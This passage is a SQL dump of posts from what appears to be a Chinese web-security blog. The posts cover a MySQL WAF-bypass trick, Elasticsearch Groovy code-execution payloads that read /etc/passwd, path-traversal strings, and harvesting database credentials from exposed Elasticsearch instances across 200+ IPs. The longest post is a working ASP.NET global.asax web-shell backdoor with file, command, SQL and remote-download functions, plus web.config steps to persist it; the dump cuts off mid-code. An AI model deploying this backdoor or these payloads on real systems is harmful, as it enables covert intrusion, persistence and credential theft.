href=\"http://pan.baidu.com/s/1pJHSPFd\">jsoup-1.8.1-yz.jar</a></p>', null, '2015-01-30 15:47:18', '1', '720', null, '0', '2015-01-30 15:49:44'), ('1683', '5', '14', '[zone]mysql 语法绕过一些WAF', 'Anonymous', '转:<a href=\"http://zone.wooyun.org/content/18601\">mysql syntax bypass some WAF</a>\n<p>一个小tips，twitter上看见的：</p>\n<p>一句话：</p>\n<pre class=\"brush: sql; gutter: true\">select{x table_name}from{x information_schema.tables}</pre>\n测试:\n<pre class=\"brush: sql; gutter: true\">mysql&gt; select{x table_name}from{x information_schema.tables};\n+----------------------------------------------------+\n| table_name                                         |\n+----------------------------------------------------+\n| CHARACTER_SETS                                     |\n| COLLATIONS                                         |\n| COLLATION_CHARACTER_SET_APPLICABILITY              |\n| COLUMNS                                            |\n| COLUMN_PRIVILEGES                                  |\n| ENGINES                                            |\n..........</pre>\n<p>https://twitter.com/Black2Fan/status/564746640138182656</p>\n<p>http://dev.mysql.com/doc/refman/5.6/en/date-and-time-literals.html#date-and-time-standard-sql-literals</p>\n<p>http://dev.mysql.com/doc/refman/5.6/en/join.html#idm140714470997024</p>', null, '2015-02-10 21:20:12', '1', '766', null, '2', '2015-02-10 21:25:00'), ('1686', '1', '10', 'alexa和quantcast排名前100W网站', '园长', '某些时候测试会用到，这里是alexa排名前100W网站和近期quantcast的排名前100W网站域名。\n<p><a href=\"http://pan.baidu.com/s/1kTBVIuz\">alexa和quantcast排名前100W网站</a></p>', null, '2015-02-12 10:48:43', '1', '786', null, '0', '2015-02-12 10:48:43'), ('1690', '1', '13', 'elasticsearch scripting security issues', '园长', 'elasticsearch scripting:\n<p><a href=\"http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html\">http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html</a></p>\n<p>security issues:</p>\n<p><a href=\"http://www.elasticsearch.org/community/security/\">http://www.elasticsearch.org/community/security/</a></p>\n<p><a href=\"http://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&amp;mid=202983721&amp;idx=1&amp;sn=bde079dcee38c4c655e920cbcc78c6e8&amp;scene=0\">http://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&amp;mid=202983721&amp;idx=1&amp;sn=bde079dcee38c4c655e920cbcc78c6e8&amp;scene=0</a></p>\n<p>POC：</p>\n<pre class=\"brush: java; gutter: true\">Math.class.forName(\\&quot;java.lang.Runtime\\&quot;).getRuntime().exec(\\&quot;whoami\\&quot;).getText()</pre>\n<pre class=\"brush: java; gutter: true\">super.class.toString().valueOf(&#039;whoami&#039;).execute().getText()</pre>\n<a href=\"http://zone.wooyun.org/content/18915\">http://zone.wooyun.org/content/18915</a>\n<pre class=\"brush: java; gutter: true\">{&quot;size&quot;:1,&quot;script_fields&quot;: {&quot;iswin&quot;: {&quot;script&quot;:&quot;java.lang.Math.class.forName(\\&quot;java.io.BufferedReader\\&quot;).getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\\&quot;java.io.InputStreamReader\\&quot;).getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\\&quot;java.lang.Runtime\\&quot;).getRuntime().exec(\\&quot;cat /etc/passwd\\&quot;).getInputStream())).readLines()&quot;,&quot;lang&quot;: &quot;groovy&quot;}}}</pre>\n<pre class=\"brush: actionscript3; gutter: true\">{\n  &quot;size&quot;: 1, \n  &quot;query&quot;: {\n    &quot;function_score&quot;: {\n      &quot;script_score&quot;: {\n        &quot;script&quot;: &quot;POC............&quot;,\n        &quot;lang&quot;: &quot;groovy&quot;\n      }\n    }\n  }\n}</pre>\n<pre class=\"brush: actionscript3; gutter: true\">{\n    &quot;size&quot;: 1, \n    &quot;script_fields&quot;: {\n        &quot;my_field&quot;: {\n            &quot;script&quot;: &quot;POC..........&quot;\n        }\n    }\n}</pre>', null, '2015-03-05 10:02:24', '1', '731', null, '2', '2015-03-06 11:10:26'), ('1698', '1', '10', '[分享]1.9亿域名A记录(主域名:1.18亿，子域名7300万)', '园长', '最近社区里很多人在搞大数据分析，之前也有整理过一些数据但是量不大。这次给大家分享来自dnscensus 2013的大量域名解析数据。首先@<a href=\"http://zone.wooyun.org/user/insight-labs\" target=\"_blank\">insight-labs</a> 感谢A牛!\n<pre class=\"brush: actionscript3; gutter: true\">总域名数量:191846073 \n主域:118212410 \n子域名:73633663 \n来源:dnscensus 2013 \n整理:admin@javaweb.org</pre>\n<p>主域名:</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/03/1.jpg\"><img class=\"alignnone size-full wp-image-1701\" src=\"http://javaweb.org/wp-content/uploads/2015/03/1.jpg\" alt=\"1\" width=\"723\" height=\"606\" /></a></p>\n<p>子域名:</p>\n<p><img class=\"alignnone size-full wp-image-1700\" src=\"http://javaweb.org/wp-content/uploads/2015/03/2.jpg\" alt=\"2\" width=\"749\" height=\"612\" /></p>\n<p>其他相关数据收集:</p>\n<p><a href=\"http://javaweb.org/?p=1686\" target=\"_blank\">alexa和quantcast排名前100W网站</a></p>\n<p><a href=\"http://javaweb.org/?p=1643\" target=\"_blank\">子域名Top 3000</a></p>\n<p><img class=\"alignnone size-full wp-image-1699\" src=\"http://javaweb.org/wp-content/uploads/2015/03/3.jpg\" alt=\"3\" width=\"416\" height=\"89\" /></p>\n<p>下载地址:<a href=\"http://pan.baidu.com/s/1sj9I6Pv\" target=\"_blank\">domain.zip</a></p>', null, '2015-03-16 17:55:42', '1', '862', null, '1', '2015-03-16 17:55:42'), ('1711', '1', '3', 'HttpServletRequestWrapper 编码问题', '园长', '当发现经过Wrapper后Spring setCharacterEncoding还乱码时，可以实现HttpServletRequestWrapper，重写<span class=\"s1\">public</span> String[] getParameterValues(String name) {....}等方法，再Encoding已设了encoding。\n<pre class=\"brush: java; gutter: true\">/**\n     * 获取应用层的编码方式，应用层Filter需要setCharacterEncoding避免乱码问题\n     * 当getCharacterEncoding不为空那么就可以从RequestWrapper中获取转换编码\n     * 后的字符串了\n     * @param request\n     * @return\n     */\n    public static String getCharacterEncoding(HttpServletRequest request){\n    	String encoding = request.getCharacterEncoding();\n    	return encoding != null ? encoding : &quot;ISO8859-1&quot;;\n    }\n    /**\n     * 避免Filter乱码问题，默认ISO8859-1,如果应用层setCharacterEncoding需要取出\n     * setCharacterEncoding的编码方式\n     * @param obj\n     * @param encoding\n     * @return\n     */\n    public static String[] encoding(String[] obj,String encoding){\n		if (StringUtil.isNotEmpty(obj)) {\n			if(!encoding.equalsIgnoreCase(&quot;ISO8859-1&quot;)){\n				try {\n					if (obj.length &gt; 1) {\n						List&lt;String&gt; ls = Arrays.asList((String[]) obj);\n						String[] str = new String[ls.size()];\n						for (int i = 0; i &lt; ls.size(); i++) {\n							str[i] = new String(ls.get(i).getBytes(&quot;ISO8859-1&quot;),encoding);\n						}\n						return str;\n					} else {\n						return new String[] {new String(obj[0].getBytes(&quot;ISO8859-1&quot;),encoding) };\n					}\n				} catch (UnsupportedEncodingException e) {\n					logger.info(e.toString());\n				}\n			}else{\n				return obj;\n			}\n		}\n		return null;\n    }</pre>', null, '2015-03-30 10:32:48', '1', '809', null, '1', '2015-03-30 10:32:48'), ('1718', '1', '14', 'Elasticsearch 任意文件读取漏洞(CVE-2015-3337)', '园长', '@盛大网络\n<p>elasticsearch又出新版本了，这次修复了一个任意文件读取漏洞（写的是目录遍历）。</p>\n<p>官方的release notes:</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/04/1.jpg\"><img class=\"alignnone size-full wp-image-1719\" src=\"http://javaweb.org/wp-content/uploads/2015/04/1.jpg\" alt=\"1\" width=\"999\" height=\"762\" /></a></p>\n<p>在这里看描述:<a href=\"https://github.com/elastic/elasticsearch/pull/10815\" target=\"_blank\">https://github.com/elastic/elasticsearch/pull/10815</a></p>\n<p>在这里看漏洞详情：<a href=\"https://github.com/spinscale/elasticsearch/commit/5d8e9e24c917b5f2c0958ba68be34a42efaeadbc\" target=\"_blank\">https://github.com/spinscale/elasticsearch/commit/5d8e9e24c917b5f2c0958ba68be34a42efaeadbc</a></p>\n<p>原来代码是：</p>\n<pre class=\"brush: java; gutter: true\">if (!Files.exists(file) || Files.isHidden(file)) {</pre>\n修改后加了验证\n<pre class=\"brush: java; gutter: true\">if (!Files.exists(file) || Files.isHidden(file) || !file.toAbsolutePath().normalize().startsWith(siteFile.toAbsolutePath())) {</pre>\n@Test\n<pre class=\"brush: java; gutter: true\">/** \n+     * Test normalizing of path \n+     */ \n+    @Test \n+    public void testThatPathsAreNormalized() throws Exception { \n+        // more info: https://www.owasp.org/index.php/Path_Traversal \n+        List&lt;String&gt; notFoundUris = new ArrayList&lt;&gt;(); \n+        notFoundUris.add(&quot;/_plugin/dummy/../../../../../log4j.properties&quot;); \n+        notFoundUris.add(&quot;/_plugin/dummy/../../../../../%00log4j.properties&quot;); \n+        notFoundUris.add(&quot;/_plugin/dummy/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%aflog4j.properties&quot;); \n+        notFoundUris.add(&quot;/_plugin/dummy/%2E%2E/%2E%2E/%2E%2E/%2E%2E/index.html&quot;); \n+        notFoundUris.add(&quot;/_plugin/dummy/%2e%2e/%2e%2e/%2e%2e/%2e%2e/index.html&quot;); \n+        notFoundUris.add(&quot;/_plugin/dummy/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2findex.html&quot;); \n+        notFoundUris.add(&quot;/_plugin/dummy/%2E%2E/%2E%2E/%2E%2E/%2E%2E/index.html&quot;); \n+        notFoundUris.add(&quot;/_plugin/dummy/..\\\\..\\\\..\\\\..\\\\..\\\\log4j.properties&quot;); \n+ \n+        for (String uri : notFoundUris) { \n+            HttpResponse response = httpClient().path(uri).execute(); \n+            String message = String.format(Locale.ROOT, &quot;URI [%s] expected to be not found&quot;, uri); \n+            assertThat(message, response.getStatusCode(), equalTo(RestStatus.NOT_FOUND.getStatus())); \n+        } \n+ \n+        // using relative path inside of the plugin should work \n+        HttpResponse response = httpClient().path(&quot;/_plugin/dummy/dir1/../dir1/../index.html&quot;).execute(); \n+        assertThat(response.getStatusCode(), equalTo(RestStatus.OK.getStatus())); \n+        assertThat(response.getBody(), containsString(&quot;&lt;title&gt;Dummy Site Plugin&lt;/title&gt;&quot;)); \n+    }</pre>\n<p>最后会这样被调用：</p>\n<pre class=\"brush: java; gutter: true\">try { \n            byte[] data = Files.readAllBytes(file); \n            channel.sendResponse(new BytesRestResponse(OK, guessMimeType(sitePath), data)); \n        } catch (IOException e) { \n            channel.sendResponse(new BytesRestResponse(INTERNAL_SERVER_ERROR)); \n        }</pre>\n<p>JDK7的Files把一个文件的内容读取后返回给客户端.</p>\n<p>这里详情在：<a href=\"https://github.com/spinscale/elasticsearch/blob/5d8e9e24c917b5f2c0958ba68be34a42efaeadbc/src/main/java/org/elasticsearch/http/HttpServer.java\" target=\"_blank\">https://github.com/spinscale/elasticsearch/blob/5d8e9e24c917b5f2c0958ba68be34a42efaeadbc/src/main/java/org/elasticsearch/http/HttpServer.java</a></p>\n<p>利用代码：curl http:// @wolf /_plugin/head/xxxxxx,注意curl版本.@wolf</p>', null, '2015-04-28 19:02:56', '1', '800', null, '0', '2015-04-28 19:02:56'), ('1733', '1', '13', 'elasticsearch 未授权访问-数据库配置信息泄漏', '园长', 'elasticsearch在安装了river之后可以同步多种数据库数据（包括关系型的mysql、mongodb等）\n<p>安装过程看这里：<a href=\"https://github.com/jprante/elasticsearch-jdbc\" target=\"_blank\">https://github.com/jprante/elasticsearch-jdbc</a></p>\n<p>那么怎么知道别人是不是在用elasticsearch的river呢？</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/05/1.jpg\"><img class=\"alignnone size-full wp-image-1734\" src=\"http://javaweb.org/wp-content/uploads/2015/05/1.jpg\" alt=\"1\" width=\"417\" height=\"143\" /></a></p>\n<p>http://localhost:9200/_cat/indices里面的indices包含了_river一般就是了。</p>\n<p>查看river详细信息：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/05/2.jpg\"><img class=\"alignnone size-full wp-image-1736\" src=\"http://javaweb.org/wp-content/uploads/2015/05/2.jpg\" alt=\"2\" width=\"671\" height=\"792\" /></a> <a href=\"http://javaweb.org/wp-content/uploads/2015/05/4.jpg\"><img class=\"alignnone size-full wp-image-1737\" src=\"http://javaweb.org/wp-content/uploads/2015/05/4.jpg\" alt=\"4\" width=\"626\" height=\"748\" /></a> <a href=\"http://javaweb.org/wp-content/uploads/2015/05/5.jpg\"><img class=\"alignnone size-full wp-image-1738\" src=\"http://javaweb.org/wp-content/uploads/2015/05/5.jpg\" alt=\"5\" width=\"592\" height=\"755\" /></a></p>\n<pre class=\"brush: actionscript3; gutter: true\">jdbc: { \nurl: &quot;jdbc:mysql://localhost:3306/库名&quot;, \nuser: &quot;root&quot;, \npassword: &quot;密码&quot;, \nsql: &quot;select * from 表&quot; \n}</pre>\n<p>我试了下</p>\n<p>嗯，不错</p>\n<p>跑了200多个配置了_river的IP，mysql、mongodb，redis比较多</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/05/3.jpg\"><img class=\"alignnone size-full wp-image-1735\" src=\"http://javaweb.org/wp-content/uploads/2015/05/3.jpg\" alt=\"3\" width=\"210\" height=\"763\" /></a></p>', null, '2015-05-10 19:46:51', '1', '1136', null, '1', '2015-05-10 19:46:51'), ('1744', '1', '12', 'sqlplus.jar命令行下连接Mysql、SQLServer、Oracle小工具', '园长', '使用了一个<a href=\"https://code.google.com/p/java-ascii-table/\">btc-ascii-table</a>小工具，可以像mysql客户端一样方便的管理数据库。自带mysql、sqlserver2000、2005+、oracle数据库驱动，可以在命令行下直连这几种数据库。连接的时候需要自行指定对应的数据库的驱动URL哦，百度下jdbc或者参考我以前的文章。\r\n<p>\r\n	交互shell方式：\r\n</p>\r\n<p>\r\n	<a href=\"http://javaweb.org/wp-content/uploads/2015/05/1.png\"><img class=\"alignnone size-full wp-image-1745\" src=\"http://javaweb.org/wp-content/uploads/2015/05/1.png\" alt=\"1\" width=\"970\" height=\"688\" /></a>\r\n</p>\r\n<p>\r\n	直接执行命令方式：\r\n</p>\r\n<pre class=\"brush: sql; gutter: true\">java -jar sqlplus.jar \"com.mysql.jdbc.Driver\" \"jdbc:mysql://localhost:3306/mysql\" \"root\" \"c123456\" \"select version()\"\r\n</pre>\r\n<p>\r\n	<a href=\"http://javaweb.org/wp-content/uploads/2015/05/21.jpg\"><img class=\"alignnone size-full wp-image-1749\" src=\"http://javaweb.org/wp-content/uploads/2015/05/21.jpg\" alt=\"2\" width=\"842\" height=\"123\" /></a>\r\n</p>\r\n<pre class=\"brush: java; gutter: true\">import java.io.BufferedReader;\r\nimport java.io.InputStreamReader;\r\nimport java.sql.Connection;\r\nimport java.sql.DriverManager;\r\nimport com.bethecoder.ascii_table.ASCIITable;\r\nimport com.bethecoder.ascii_table.impl.JDBCASCIITableAware;\r\nimport com.bethecoder.ascii_table.spec.IASCIITableAware;\r\npublic class SqlPlus {\r\n	private static Connection conn = null;\r\n	public static void getConnection(String driver,String url,String user,String pass) {\r\n		try {\r\n			Class.forName(driver);\r\n			conn = DriverManager.getConnection(url,user,pass);\r\n		} catch (Exception e) {\r\n			e.printStackTrace();\r\n		}\r\n	}\r\n	public static void executeSQL(String sql) {\r\n		try {\r\n			if(!sql.isEmpty()){\r\n				try {\r\n					IASCIITableAware asciiTableAware = new JDBCASCIITableAware(conn, sql);\r\n					ASCIITable.getInstance().printTable(asciiTableAware);\r\n				} catch (Exception e) {\r\n					System.out.println(e.toString());\r\n				}\r\n			}\r\n			System.out.print(conn.getMetaData().getDatabaseProductName()+\"&gt; \");\r\n			String str = new BufferedReader(new InputStreamReader(System.in)).readLine();\r\n			if(!\"exit\".equalsIgnoreCase(str)){\r\n				executeSQL(str);\r\n			}else{\r\n				return;\r\n			}\r\n		} catch (Exception e) {\r\n			System.out.println(e.toString());\r\n		}\r\n	}\r\n	public static void main(String[] args) {\r\n		try {\r\n			if(args.length == 5){\r\n				getConnection(args[0],args[1],args[2],args[3]);\r\n				IASCIITableAware asciiTableAware = new JDBCASCIITableAware(conn, args[4]);\r\n				ASCIITable.getInstance().printTable(asciiTableAware);\r\n			}else{\r\n				System.out.print(\"Driver:\");\r\n				String driver = new BufferedReader(new InputStreamReader(System.in)).readLine();\r\n				System.out.print(\"URL:\");\r\n				String url = new BufferedReader(new InputStreamReader(System.in)).readLine();\r\n				System.out.print(\"username:\");\r\n				String user = new BufferedReader(new InputStreamReader(System.in)).readLine();\r\n				System.out.print(\"password:\");\r\n				String passwd = new BufferedReader(new InputStreamReader(System.in)).readLine();\r\n				getConnection(driver,url,user,passwd);\r\n				System.out.print(\"\\r\\n\"+conn.getMetaData().getDatabaseProductName()+\"&gt; \");\r\n				String sql = new BufferedReader(new InputStreamReader(System.in)).readLine();\r\n				if(conn != null){\r\n					executeSQL(sql);\r\n				}\r\n			}\r\n		} catch (Exception e) {\r\n			e.printStackTrace();\r\n		}\r\n	}\r\n}\r\n</pre>\r\n<p>\r\n	下载地址：<a href=\"http://javaweb.org/tools/sqlplus.jar\" target=\"_blank\">sqlplus.jar</a>\r\n</p>', null, '2015-05-30 01:57:59', '1', '827', null, '0', '2015-08-21 01:59:14');
INSERT INTO `sys_posts` VALUES ('1755', '1', '12', 'ASP.NET global.asax、httpHandlers、httpModules 后门', '园长', '特别注意：<strong><b>需要特别小心配置任何一个误操作都可能导致网站彻底崩溃,对于新手操作危险系数很高。这里只是技术分享，请最好先在本地测试。如有发现BUG与我联系 :)</b></strong>\n<p><strong>一：global.asax</strong></p>\n<pre class=\"brush: csharp; gutter: true\">&lt;%@ Application Language=&quot;C#&quot; %&gt;\n&lt;script RunAt=&#039;server&#039;&gt;\n    void Application_Start(object sender, EventArgs e)\n    {\n        //在应用程序启动时运行的代码\n    }\n    void Application_End(object sender, EventArgs e)\n    {\n        //在应用程序关闭时运行的代码\n    }\n    void Application_Error(object sender, EventArgs e)\n    {\n    }\n    void Session_Start(object sender, EventArgs e)\n    {\n        //在新会话启动时运行的代码\n    }\n    void Session_End(object sender, EventArgs e)\n    {\n        //在会话结束时运行的代码。 \n        // 注意: 只有在 Web.config 文件中的 sessionstate 模式设置为\n        // InProc 时，才会引发 Session_End 事件。如果会话模式 \n        //设置为 StateServer 或 SQLServer，则不会引发该事件。\n    }\n    void CP(string S, string D)\n    {\n        if (System.IO.Directory.Exists(S))\n        {\n            System.IO.DirectoryInfo m = new System.IO.DirectoryInfo(S);\n            System.IO.Directory.CreateDirectory(D);\n            foreach (System.IO.FileInfo F in m.GetFiles())\n            {\n                System.IO.File.Copy(S + &quot;\\\\&quot; + F.Name, D + &quot;\\\\&quot; + F.Name);\n            }\n            foreach (System.IO.DirectoryInfo F in m.GetDirectories())\n            {\n                CP(S + &quot;\\\\&quot; + F.Name, D + &quot;\\\\&quot; + F.Name);\n            }\n        }\n        else\n        {\n            System.IO.File.Copy(S, D);\n        }\n    }\n    void EvalRequest(string action)\n    {\n        HttpContext context = HttpContext.Current;\n        HttpRequest request = context.Request;\n        HttpResponse response = context.Response;\n        string Z = action;\n        if (Z != &quot;&quot;)\n        {\n            string Z1 = request.Form[&quot;Z1&quot;];\n            string Z2 = request.Form[&quot;Z2&quot;];\n            string R = &quot;&quot;;\n            try\n            {\n                switch (Z)\n                {\n                    case &quot;A&quot;:\n                        {\n                            string[] c = System.IO.Directory.GetLogicalDrives();\n                            R = string.Format(&quot;{0}\\t&quot;, context.Server.MapPath(&quot;~&quot;));\n                            for (int i = 0; i &lt; c.Length; i++)\n                                R += c[i][0] + &quot;:&quot;;\n                            break;\n                        }\n                    case &quot;B&quot;:\n                        {\n                            System.IO.DirectoryInfo m = new System.IO.DirectoryInfo(Z1);\n                            foreach (System.IO.DirectoryInfo D in m.GetDirectories())\n                            {\n                                R += string.Format(&quot;{0}/\\t{1}\\t0\\t-\\n&quot;, D.Name, System.IO.File.GetLastWriteTime(Z1 + D.Name).ToString(&quot;yyyy-MM-dd hh:mm:ss&quot;));\n                            }\n                            foreach (System.IO.FileInfo D in m.GetFiles())\n                            {\n                                R += string.Format(&quot;{0}\\t{1}\\t{2}\\t-\\n&quot;, D.Name, System.IO.File.GetLastWriteTime(Z1 + D.Name).ToString(&quot;yyyy-MM-dd hh:mm:ss&quot;), D.Length);\n                            }\n                            break;\n                        }\n                    case &quot;C&quot;:\n                        {\n                            System.IO.StreamReader m = new System.IO.StreamReader(Z1, Encoding.Default);\n                            R = m.ReadToEnd();\n                            m.Close();\n                            break;\n                        }\n                    case &quot;D&quot;:\n                        {\n                            System.IO.StreamWriter m = new System.IO.StreamWriter(Z1, false, Encoding.Default);\n                            m.Write(Z2);\n                            R = &quot;1&quot;;\n                            m.Close();\n                            break;\n                        }\n                    case &quot;E&quot;:\n                        {\n                            if (System.IO.Directory.Exists(Z1))\n                                System.IO.Directory.Delete(Z1, true);\n                            else\n                                System.IO.File.Delete(Z1);\n                            R = &quot;1&quot;;\n                            break;\n                        }\n                    case &quot;F&quot;:\n                        {\n                            response.Clear();\n                            response.Write(&quot;\\x2D\\x3E\\x7C&quot;);\n                            response.WriteFile(Z1);\n                            response.Write(&quot;\\x7C\\x3C\\x2D&quot;);\n                            goto End;\n                        }\n                    case &quot;G&quot;:\n                        {\n                            byte[] B = new byte[Z2.Length / 2];\n                            for (int i = 0; i &lt; Z2.Length; i += 2)\n                            {\n                                B[i / 2] = (byte)Convert.ToInt32(Z2.Substring(i, 2), 16);\n                            }\n                            System.IO.FileStream fs = new System.IO.FileStream(Z1, System.IO.FileMode.Create);\n                            fs.Write(B, 0, B.Length);\n                            fs.Close();\n                            R = &quot;1&quot;;\n                            break;\n                        }\n                    case &quot;H&quot;:\n                        {\n                            CP(Z1, Z2);\n                            R = &quot;1&quot;;\n                            break;\n                        }\n                    case &quot;I&quot;:\n                        {\n                            if (System.IO.Directory.Exists(Z1))\n                            {\n                                System.IO.Directory.Move(Z1, Z2);\n                            }\n                            else\n                            {\n                                System.IO.File.Move(Z1, Z2);\n                            }\n                            break;\n                        }\n                    case &quot;J&quot;:\n                        {\n                            System.IO.Directory.CreateDirectory(Z1);\n                            R = &quot;1&quot;;\n                            break;\n                        }\n                    case &quot;K&quot;:\n                        {\n                            DateTime TM = Convert.ToDateTime(Z2);\n                            if (System.IO.Directory.Exists(Z1))\n                            {\n                                System.IO.Directory.SetCreationTime(Z1, TM);\n                                System.IO.Directory.SetLastWriteTime(Z1, TM);\n                                System.IO.Directory.SetLastAccessTime(Z1, TM);\n                            }\n                            else\n                            {\n                                System.IO.File.SetCreationTime(Z1, TM);\n                                System.IO.File.SetLastWriteTime(Z1, TM);\n                                System.IO.File.SetLastAccessTime(Z1, TM);\n                            }\n                            R = &quot;1&quot;;\n                            break;\n                        }\n                    case &quot;L&quot;:\n                        {\n                            System.Net.HttpWebRequest RQ = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(new Uri(Z1));\n                            RQ.Method = &quot;GET&quot;;\n                            RQ.ContentType = &quot;application/x-www-form-urlencoded&quot;;\n                            System.Net.HttpWebResponse WB = (System.Net.HttpWebResponse)RQ.GetResponse();\n                            System.IO.Stream WF = WB.GetResponseStream();\n                            System.IO.FileStream FS = new System.IO.FileStream(Z2, System.IO.FileMode.Create, System.IO.FileAccess.Write);\n                            int i;\n                            byte[] buffer = new byte[1024];\n                            while (true)\n                            {\n                                i = WF.Read(buffer, 0, buffer.Length);\n                                if (i &lt; 1) break; FS.Write(buffer, 0, i);\n                            }\n                            WF.Close();\n                            WB.Close();\n                            FS.Close();\n                            R = &quot;1&quot;;\n                            break;\n                        }\n                    case &quot;M&quot;:\n                        {\n                            System.Diagnostics.ProcessStartInfo c = new System.Diagnostics.ProcessStartInfo(Z1.Substring(2));\n                            System.Diagnostics.Process e = new System.Diagnostics.Process();\n                            System.IO.StreamReader OT, ER;\n                            c.UseShellExecute = false;\n                            c.RedirectStandardOutput = true;\n                            c.RedirectStandardError = true;\n                            e.StartInfo = c;\n                            c.Arguments = string.Format(&quot;{0} {1}&quot;, Z1.Substring(0, 2), Z2);\n                            e.Start(); OT = e.StandardOutput;\n                            ER = e.StandardError;\n                            e.Close();\n                            R = OT.ReadToEnd() + ER.ReadToEnd();\n                            break;\n                        }\n                    case &quot;N&quot;:\n                        {\n                            String strDat = Z1.ToUpper();\n                            System.Data.SqlClient.SqlConnection Conn = new System.Data.SqlClient.SqlConnection(Z1);\n                            Conn.Open();\n                            R = Conn.Database + &quot;\\t&quot;;\n                            Conn.Close(); break;\n                        }\n                    case &quot;O&quot;:\n                        {\n                            String[] x = Z1.Replace(&quot;\\r&quot;, &quot;&quot;).Split(&#039;\\n&#039;);\n                            String strConn = x[0], strDb = x[1];\n                            System.Data.SqlClient.SqlConnection Conn = new System.Data.SqlClient.SqlConnection(strConn);\n                            Conn.Open();\n                            System.Data.DataTable dt = Conn.GetSchema(&quot;Columns&quot;);\n                            Conn.Close();\n                            for (int i = 0; i &lt; dt.Rows.Count; i++)\n                            {\n                                R += String.Format(&quot;{0}\\t&quot;, dt.Rows[i][2].ToString());\n                            }\n                            break;\n                        }\n                    case &quot;P&quot;:\n                        {\n                            String[] x = Z1.Replace(&quot;\\r&quot;, &quot;&quot;).Split(&#039;\\n&#039;), p = new String[4];\n                            String strConn = x[0], strDb = x[1], strTable = x[2]; p[0] = strDb;\n                            p[2] = strTable;\n                            System.Data.SqlClient.SqlConnection Conn = new System.Data.SqlClient.SqlConnection(strConn);\n                            Conn.Open();\n                            System.Data.DataTable dt = Conn.GetSchema(&quot;Columns&quot;, p);\n                            Conn.Close();\n                            for (int i = 0; i &lt; dt.Rows.Count; i++)\n                            {\n                                R += String.Format(&quot;{0} ({1})\\t&quot;, dt.Rows[i][3].ToString(), dt.Rows[i][7].ToString());\n                            }\n                            break;\n                        }\n                    case &quot;Q&quot;:\n                        {\n                            String[] x = Z1.Replace(&quot;\\r&quot;, &quot;&quot;).Split(&#039;\\n&#039;);\n                            String strDat, strConn = x[0], strDb = x[1];\n                            int i, c;\n                            strDat = Z2.ToUpper();\n                            System.Data.SqlClient.SqlConnection Conn = new System.Data.SqlClient.SqlConnection(strConn);\n                            Conn.Open();\n                            if (strDat.IndexOf(&quot;SELECT &quot;) == 0 || strDat.IndexOf(&quot;EXEC &quot;) == 0 || strDat.IndexOf(&quot;DECLARE &quot;) == 0)\n                            {\n                                System.Data.SqlClient.SqlDataAdapter OD = new System.Data.SqlClient.SqlDataAdapter(Z2, Conn);\n                                System.Data.DataSet ds = new System.Data.DataSet();\n                                OD.Fill(ds);\n                                if (ds.Tables.Count &gt; 0)\n                                {\n                                    System.Data.DataRowCollection rows = ds.Tables[0].Rows;\n                                    for (c = 0; c &lt; ds.Tables[0].Columns.Count; c++)\n                                    {\n                                        R += String.Format(&quot;{0}\\t|\\t&quot;, ds.Tables[0].Columns[c].ColumnName.ToString());\n                                    }\n                                    R += &quot;\\r\\n&quot;;\n                                    for (i = 0; i &lt; rows.Count; i++)\n                                    {\n                                        for (c = 0; c &lt; ds.Tables[0].Columns.Count; c++)\n                                        {\n                                            R += String.Format(&quot;{0}\\t|\\t&quot;, rows[i][c].ToString());\n                                        }\n                                        R += &quot;\\r\\n&quot;;\n                                    }\n                                }\n                                ds.Clear();\n                                ds.Dispose();\n                            }\n                            else\n                            {\n                                System.Data.SqlClient.SqlCommand cm = Conn.CreateCommand();\n                                cm.CommandText = Z2;\n                                cm.ExecuteNonQuery();\n                                R = &quot;Result\\t|\\t\\r\\nExecute Successfully!\\t|\\t\\r\\n&quot;;\n                            }\n                            Conn.Close();\n                            break;\n                        }\n                    default:\n                        goto End;\n                }\n            }\n            catch (Exception E)\n            {\n                R = &quot;ERROR:// &quot; + E.Message;\n            }\n            response.Write(&quot;\\x2D\\x3E\\x7C&quot; + R + &quot;\\x7C\\x3C\\x2D&quot;);\n        End: ;\n        }\n    }\n    //在接收到一个应用程序请求时触发。对于一个请求来说，它是第一个被触发的事件，请求一般是用户输入的一个页面请求（URL）。\n    void Application_BeginRequest(object sender, EventArgs evt)\n    {\n        string action = Request.Form[&quot;023&quot;];\n        if (action != null)\n        {\n            EvalRequest(action);\n            Response.End();\n        }\n    }\n&lt;/script&gt;</pre>\n<p><p class=\"p1\"><strong>二、httpHandlers</strong></p></p>\n<p><p class=\"p1\">修改web.config，添加或者修改httpHandlers:</p></p>\n<pre class=\"brush: xml; gutter: true\">&lt;httpHandlers&gt;\n   &lt;add path=&quot;*.api&quot; verb=&quot;*&quot; type=&quot;WooYun.CustomizeHttpHandler&quot;/&gt;\n&lt;/httpHandlers&gt;</pre>\n<p><p class=\"p1\">如果已经存在 httpHandlers 则在标签内添加，如果&lt;system.webServer&gt;也有配置httpHandlers那么就配置在&lt;system.webServer&gt;里，但是有一点需要特别注意：<strong>&lt;system.webServer&gt;里面一定要配置runAllManagedModulesForAllRequests为true,否会启动报错。</strong></p></p>\n<pre class=\"brush: xml; gutter: true\">&lt;system.webServer&gt;\n	&lt;modules runAllManagedModulesForAllRequests=&quot;true&quot; /&gt;\n&lt;/system.webServer&gt;</pre>\n<p><p class=\"p1\"><strong>三：httpModules</strong></p></p>\n<p><p class=\"p1\">相比修改httpHandlers显然这种办法更加的有效且安全一些。但是一定要把这个httpModule的顺序配置到httpModules的第一个。修改web.config，添加或者修改httpHandlers:</p></p>\n<pre class=\"brush: xml; gutter: true\">&lt;httpModules&gt;\n        &lt;add name=&quot;WooYun&quot; type=&quot;WooYun.CustomizeHttpModule&quot;/&gt;\n&lt;/httpModules&gt;</pre>\n<p><p class=\"p1\">Customize.cs代码：</p></p>\n<pre class=\"brush: csharp; gutter: true\">using System;\nusing 